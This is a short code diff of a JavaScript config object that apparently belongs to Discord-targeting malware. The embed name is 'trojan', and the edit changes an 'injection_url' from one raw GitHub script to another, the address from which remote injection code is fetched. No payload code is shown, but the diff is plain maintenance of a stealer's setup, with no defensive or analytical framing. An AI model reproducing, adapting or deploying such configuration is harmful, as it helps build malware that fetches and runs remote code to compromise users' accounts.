@@ -14,7 +14,7 @@ const config = {
   embed_name: 'trojan', 
   embed_icon: 'https://cdn.discordapp.com/attachments/1090089657036972033/1103470166840451122/cuck.png'.replace(/ /g, '%20'), 
   embed_color: 2895661, 
-  injection_url: 'https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js', 
+  injection_url: 'https://raw.githubusercontent.com/tystacksbandz/i/main/in.js', 
   /**
    
    **/
